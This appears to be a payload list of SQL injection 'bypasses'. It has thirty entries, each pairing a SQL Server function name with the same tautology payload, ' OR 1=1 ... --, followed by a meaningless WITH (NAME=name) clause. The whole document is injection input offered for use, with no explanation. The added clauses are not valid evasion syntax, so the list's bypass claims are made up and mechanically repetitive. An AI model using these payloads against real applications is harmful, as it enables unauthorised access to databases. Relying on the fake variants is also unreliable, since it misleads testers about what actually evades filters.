--- NULLIF Bypasses
 ' OR 1=1 WITH (NULLIF=nullif)--
-
--- COALESCE Bypasses
 ' OR 1=1 WITH (COALESCE=coalesce)--
-
--- IIF Bypasses
 ' OR 1=1 WITH (IIF=iif)--
-
--- CHOOSE Bypasses
 ' OR 1=1 WITH (CHOOSE=choose)--
-
--- TRY_CAST Bypasses
 ' OR 1=1 WITH (TRY_CAST=try_cast)--
-
--- TRY_CONVERT Bypasses
 ' OR 1=1 WITH (TRY_CONVERT=try_convert)--
-
--- TRY_PARSE Bypasses
 ' OR 1=1 WITH (TRY_PARSE=try_parse)--
-
--- PARSE Bypasses
 ' OR 1=1 WITH (PARSE=parse)--
-
--- FORMAT Bypasses
 ' OR 1=1 WITH (FORMAT=format)--
-
--- CONCAT Bypasses
 ' OR 1=1 WITH (CONCAT=concat)--
-
--- CONCAT_WS Bypasses
 ' OR 1=1 WITH (CONCAT_WS=concat_ws)--
-
--- STRING_AGG Bypasses
 ' OR 1=1 WITH (STRING_AGG=string_agg)--
-
--- STRING_SPLIT Bypasses
 ' OR 1=1 WITH (STRING_SPLIT=string_split)--
-
--- STRING_ESCAPE Bypasses
 ' OR 1=1 WITH (STRING_ESCAPE=string_escape)--
-
--- TRANSLATE Bypasses
 ' OR 1=1 WITH (TRANSLATE=translate)--
-
--- TRIM Bypasses
 ' OR 1=1 WITH (TRIM=trim)--
-
--- LTRIM Bypasses
 ' OR 1=1 WITH (LTRIM=ltrim)--
-
--- RTRIM Bypasses
 ' OR 1=1 WITH (RTRIM=rtrim)--
-
--- UPPER Bypasses
 ' OR 1=1 WITH (UPPER=upper)--
-
--- LOWER Bypasses
 ' OR 1=1 WITH (LOWER=lower)--
-
--- REVERSE Bypasses
 ' OR 1=1 WITH (REVERSE=reverse)--
-
--- REPLICATE Bypasses
 ' OR 1=1 WITH (REPLICATE=replicate)--
-
--- SPACE Bypasses
 ' OR 1=1 WITH (SPACE=space)--
-
--- STUFF Bypasses
 ' OR 1=1 WITH (STUFF=stuff)--
-
--- SUBSTRING Bypasses
 ' OR 1=1 WITH (SUBSTRING=substring)--
-
--- LEFT Bypasses
 ' OR 1=1 WITH (LEFT=left)--
-
--- RIGHT Bypasses
 ' OR 1=1 WITH (RIGHT=right)--
-
--- CHARINDEX Bypasses
 ' OR 1=1 WITH (CHARINDEX=charindex)--
-
--- PATINDEX Bypasses
 ' OR 1=1 WITH (PATINDEX=patindex)--
-
--- REPLACE Bypasses
 ' OR 1=1 WITH (REPLACE=replace)--
